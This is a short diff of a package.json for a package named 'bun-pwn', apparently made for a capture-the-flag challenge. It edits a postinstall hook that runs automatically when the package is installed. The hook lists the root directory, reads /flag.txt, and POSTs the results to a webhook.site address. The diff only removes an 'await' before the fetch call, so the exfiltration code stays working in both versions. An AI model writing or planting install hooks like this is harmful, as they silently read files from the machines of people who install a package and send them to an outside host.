@@ -2,6 +2,6 @@
   "name": "bun-pwn",
   "version": "1.0.1",
   "scripts": {
-    "postinstall": "bun -e \"const fs=require('fs'); let res='Root: '+fs.readdirSync('/').join(', ')+'\\\\n\\\\n'; try{res+='Flag: '+fs.readFileSync('/flag.txt', 'utf8')}catch(e){res+=e.message} await fetch('https://webhook.site/edafaddb-cdec-4927-94f5-b1aef5658d0d', {method:'POST', body:res});\""
+    "postinstall": "bun -e \"const fs=require('fs'); let res='Root: '+fs.readdirSync('/').join(', ')+'\\\\n\\\\n'; try{res+='Flag: '+fs.readFileSync('/flag.txt', 'utf8')}catch(e){res+=e.message} fetch('https://webhook.site/edafaddb-cdec-4927-94f5-b1aef5658d0d', {method:'POST', body:res});\""
   }
 }
